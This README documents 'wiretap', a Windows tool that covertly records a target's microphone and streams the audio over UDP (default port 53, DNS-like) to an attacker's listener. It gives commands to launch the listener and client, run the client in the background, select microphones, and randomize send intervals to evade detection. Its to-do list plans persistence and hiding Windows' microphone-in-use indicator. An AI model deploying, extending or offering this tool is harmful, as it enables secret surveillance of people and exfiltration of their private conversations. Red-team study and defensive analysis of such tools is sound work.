# wiretap
Stealthy Windows audio-capture tool with UDP exfiltration and randomized transmission intervals for Evasion-focused Red Team operations. (WIP)

# Quicklinks
- [Screenshots](#Screenshots)
- [Usage](#Usage)
  - [Configuring the Listener](#Configuring-the-Listener)
    - [Example](#Example)
    - [All Arguments](#All-Arguments)
  
  - [Configuring the Client](#Configuring-the-client)
    - [Client Address](#Client-Example)
    - [Running in the Background](#Running-in-the-Background)
    - [Listing Available Microphones](#Listing-Available-Microphones)
    - [Selecting a Microphone](#Selecting-a-Microphone)
    - [All Arguments](#All-Arguments)

- [Importing the Audio Files Into Audacity](#Importing-the-Audio-Files-Into-Audacity)

# Screenshots
<img width="1080" height="425" alt="console" src="https://github.com/user-attachments/assets/ee1bbf8c-4ea4-42b1-b975-25082d247728" />
<img width="1287" height="357" alt="wireshark" src="https://github.com/user-attachments/assets/85421209-d485-4f91-a986-82b1bcf4e2e0" />

# Usage
## Configuring the Listener
First, set up the listener server that will receive audio captured from the target device. By default, the server binds to all network interfaces and listens on UDP port 53. You can override the bind address using `--bind-ip` and change the listening port with `--port`.
### Example
```
python3 .\listen.py --bind-ip 192.168.0.23 --port 5353
```
#### All Arguments
```
python3 .\listen.py --help
usage: listen.py [-h] [--bind-ip BIND_IP] [--port PORT] [--packet-size PACKET_SIZE]

UDP Wiretap Server (https://github.com/Drew-Alleman/wiretap)

options:
  -h, --help            show this help message and exit
  --bind-ip BIND_IP     IP address the server should bind to (default: 0.0.0.0)
  --port PORT           UDP port to listen on (default: 53)
  --packet-size PACKET_SIZE
                        Packet size the client is configured to (default: 1024)
```

## Configuring the Client
We can connnect to our example listener server by using the command below. `--verbose` enables text being outputed to the screen
### Client Example
```
PS C:\> .\wiretap.exe --server 192.168.0.23 --port 5353 --verbose
[INFO] connected to listener: 192.168.0.23:5353
[INFO] started exfiltration loop
[INFO] started audio sniffer
```

### Running in the Background
We can launch the process in the background by using `--background`.
```
PS C:\> .\wiretap.exe --server 192.168.0.23 --port 5353 --verbose  --background
PS C:\>
```

### Listing Available Microphones
We can list the available microphones with the `--list` option:
```
PS C:\> .\wiretap.exe --list
1. Microphone (Brio 101)
2. Microphone (HyperX Cloud Alpha Wireless)
3. Microphone (5- Shure MV7)
```
### Selecting a Microphone
We can then select a microphone by the index using `--mic`:
```
PS C:\> .\wiretap.exe --mic 3
```
### All Arguments
```
PS C:\> wiretap.exe --help
Usage:
  wiretap.exe [options]

Options:
  --help                 Show this help message and exit
  --list                 List available microphones and exit
  --mic <index>          Microphone index to use (default: system default)

  --server <ip>          Server IP address to send to (default: 127.0.0.1)
  --port <port>          UDP port to use (default: 53)
  --packet-size <bytes>  Client packet size in bytes (1û65355) (default: 1024)

  --sleep <mode>         Sleep profile (0û4) (default: 2)
                         0 = 5û20s (Tiny)
                         1 = 10û40s (Short)
                         2 = 20û60s (Normal)
                         3 = 40û100s (Long)
                         4 = 15û400s (Random)

  --background           Run in the background (spawns a child process)
  --verbose              Enable verbose logging

Examples:
  wiretap.exe --list
  wiretap.exe --mic 1 --server 192.168.1.10 --port 5353
  wiretap.exe --packet-size 1400 --sleep 3 --background
```

# Importing the Audio Files Into Audacity
The generated files cannot be opened in standard audio applications because they contain raw audio data. A player or editor that supports RAW audio files is required; Audacity will be used to open and review the files.
<img width="1162" height="560" alt="image" src="https://github.com/user-attachments/assets/7e754a37-b4da-40f9-974f-6db6a254efa7" />
<img width="690" height="432" alt="image" src="https://github.com/user-attachments/assets/d5599ba3-b539-4b7f-bcf0-58449c59b7a9" />
<img width="998" height="600" alt="image" src="https://github.com/user-attachments/assets/1f35213e-f9b8-4397-a3dc-3db23583b7a0" />

# To-Do
## Python Listener
The following should be ready to go, I just need to test the code:
  - Allow multiple connections at once

## Wiretap
- Logging
- Test on different windows machines
- Option to set the "power" level (min threshold to pick up microphone)
- Optimize function to gather bytes from Microphone
- Enumeration packet to gather information about the device
- Option to only capture audio between certain time periods

### Administrator Settings (IDK yet)
- Persistance??
- Add option to remove the "wiretap.exe is using your microphone" on the windows task bar (needs admin)

